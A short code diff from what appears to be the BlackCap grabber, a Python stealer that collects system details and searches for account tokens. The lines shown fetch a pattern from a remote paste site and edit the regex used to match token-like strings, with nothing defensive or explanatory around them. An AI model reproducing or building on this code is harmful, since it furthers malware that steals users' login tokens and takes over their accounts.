@@ -102,7 +102,7 @@ d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 
 BlackCap_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'
 reg_req = requests.get(BlackCap_Regex) 
-clear_reg = r"[\w-]{24}\." + reg_req.text
+clear_reg = r"[\w-]{24}\."
 
 class Functions(object):
     @staticmethod
